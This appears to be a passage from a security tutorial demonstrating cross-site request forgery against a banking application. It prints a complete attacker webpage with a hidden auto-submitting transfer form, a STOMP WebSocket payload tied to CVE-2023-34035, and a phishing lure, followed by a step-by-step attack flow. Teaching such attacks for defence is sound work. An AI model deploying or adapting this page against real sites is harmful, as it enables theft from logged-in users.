### Attack Demonstration

**Attacker's Malicious Webpage (hosted at evil.com/csrf-attack.html)**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Congratulations! You've won a prize!</title>
</head>
<body>
    <h1>Click below to claim your reward!</h1>

    <!-- ❌ Hidden form auto-submits to victim's bank -->
    <form id="csrf-form" 
          action="https://bank.com/api/transfers/send" 
          method="POST" 
          style="display:none;">
        <input type="hidden" name="toAccount" value="ATTACKER-ACCOUNT-12345">
        <input type="hidden" name="amount" value="500.00">
    </form>

    <script>
        // Auto-submit when page loads
        // Victim's browser includes bank.com session cookie automatically
        // No CSRF token required due to vulnerability
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>

    <!-- ❌ Alternative: STOMP WebSocket exploitation (CVE-2023-34035) -->
    <script src="https://cdn.jsdelivr.net/npm/sockjs-client@1/dist/sockjs.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/stompjs@2.3.3/lib/stomp.min.js"></script>
    <script>
        // Establish WebSocket connection to victim's bank
        // Browser includes session cookie automatically
        var socket = new SockJS('https://bank.com/ws-transfer');
        var stompClient = Stomp.over(socket);

        stompClient.connect({}, function(frame) {
            // ❌ CONNECT succeeds without CSRF token (CVE-2023-34035)

            // Send fraudulent transfer message
            stompClient.send("/app/transfer", {}, JSON.stringify({
                toAccount: "ATTACKER-ACCOUNT-12345",
                amount: 500.00
            }));
        });
    </script>
</body>
</html>
```

**Attack Flow:**

1. Victim logs into bank.com, receives session cookie: `JSESSIONID=abc123xyz789`
2. Attacker sends phishing email: "Congratulations! Click to claim your prize: evil.com/csrf-attack.html"
3. Victim clicks link while still logged into bank.com
4. Browser loads evil.com page, executes JavaScript
5. JavaScript submits POST request to bank.com/api/transfers/send
6. Browser automatically includes JSESSIONID cookie with request
7. Bank server sees valid session, assumes legitimate user action
8. No CSRF token validation occurs (disabled in config)
9. Transfer executes: $500 moved from victim to attacker account
10. Victim sees "prize" page, unaware of background transfer

**Why This Works:**
- Browser's cookie policy: cookies are origin-scoped (bank.com), not page-scoped
- Same-Origin Policy prevents reading responses across origins, but NOT sending requests
- Session cookie authenticates request, but doesn't prove user intent
- No CSRF token means server cannot distinguish forged request from legitimate one

